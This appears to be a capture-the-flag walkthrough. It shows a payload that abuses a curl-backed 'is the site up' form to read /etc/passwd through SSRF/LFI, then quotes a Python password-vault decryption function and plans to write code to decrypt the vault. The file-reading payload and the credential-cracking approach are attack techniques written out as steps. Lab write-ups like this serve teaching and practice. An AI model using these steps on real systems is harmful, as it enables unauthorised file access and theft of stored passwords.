Basic output. The machine opens http and ssh. Let's observe the webpage and look for foothold.

The page check if the webserver is down by requesting to other website from the server. It's possible that the input field is vulnerable to LFI or SSRF.

Let's check if we can exploit.

As expected, the request data can be used for LFI and I could see contents of /etc/passwd with url data http://127.0.0.1+file:///etc/passwd.

This output is not intuitive, but if we can imagine php code and what bash code is used, the mechanism is really easy.

At first, when we input only file:///etc/passwd, it returns error. However, when it comes to http://127.0.0.1:80, it doesn't. Therefore, we can predict the php checks if the first string is 'http://' or 'https://'.

Also, when we catch contents of some webpage, we use curl command on bash. Additionally, we can give it multiple argument. For example,

curl http://127.0.0.1:8000 http://127.0.0.1:80

This command returns both pages' contents. Then, when we can use url data like 'http://127.0.0.1+file:///etc/passwd', becuase + would be replaced with space cuz it is url encoded.

NOTE : file://localhost/etc/passwd is ok, but we can exclude localhost in this case.

def encrypted_file_to_lines(file_name, master_password):
    """
    This function opens and decrypts the password vault.

    Args:
        file_name (str): The name of the file containing the password vault.
        master_password (str): The master password to use to decrypt the
        password vault.

    Returns:
        list: A list of lines containing the decrypted passwords.
    """
    if not os.path.isfile(file_name):
        return ""

    with open(file_name, 'r') as file:
        encrypted_text = file.read()

    decrypted_text = cryptocode.decrypt(encrypted_text, master_password)
    if decrypted_text is False:
        return False

    decrypted_lines = decrypted_text.splitlines()
    return decrypted_lines

This snippet tells us cryptcode.dexrypt takes two arguments "encrypted_text" and "master_password".

It probably compares encrypted_text and encrypted master_password(raw string). We can create decryption code easily.
